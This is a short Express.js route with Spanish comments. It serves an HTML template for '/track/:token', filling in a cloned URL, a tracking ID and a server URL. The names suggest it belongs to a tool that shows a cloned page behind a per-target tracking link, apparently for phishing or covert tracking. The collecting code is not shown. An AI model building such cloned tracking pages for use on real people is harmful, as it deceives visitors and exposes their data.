// ========== FUNCIÓN PARA GENERAR EL ENLACE ==========
app.get('/track/:token', (req, res) => {
    const token = req.params.token;
    const data = tokens[token];
    if (!data) {
        return res.status(404).send('Enlace no válido');
    }
    
    // Leer el HTML template (el que tiene las variables {{}})
    let html = fs.readFileSync(path.join(__dirname, 'public', 'index.html'), 'utf8');
    html = html.replace('{{CLONED_URL}}', data.url);
    html = html.replace('{{TRACKING_ID}}', token);
    html = html.replace('{{SERVER_URL}}', BASE_URL); // o la URL de tu Worker
    
    res.send(html);
});
